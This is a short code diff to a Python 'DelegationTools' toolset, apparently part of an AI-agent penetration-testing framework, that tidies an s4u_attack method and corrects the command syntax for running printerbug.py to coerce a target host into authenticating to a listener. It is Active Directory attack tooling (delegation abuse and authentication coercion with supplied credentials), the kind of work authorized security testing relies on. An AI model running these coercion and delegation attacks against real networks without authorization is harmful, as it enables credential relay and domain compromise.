@@ -582,7 +582,7 @@ class DelegationTools(Toolset):
             return f"RBCD write failed: {e}"
 
     @dn.tool_method
-    def s4u_attack(  # noqa: PLR0912
+    def s4u_attack(
         self,
         target_spn: str,
         impersonate: str,
@@ -887,10 +887,10 @@ class DelegationTools(Toolset):
             return "[!] Refusing to use placeholder password; provide a real credential."
 
         # Use SpoolSample/PrinterBug for coercion
+        # krbrelayx printerbug.py syntax: domain/user:pass@target listener_ip
         cmd = [
-            "printerbug",
-            f"{domain}/{username}:{resolved_password}",
-            coerce_from,
+            "printerbug.py",
+            f"{domain}/{username}:{resolved_password}@{coerce_from}",
             listener_ip,
         ]
 
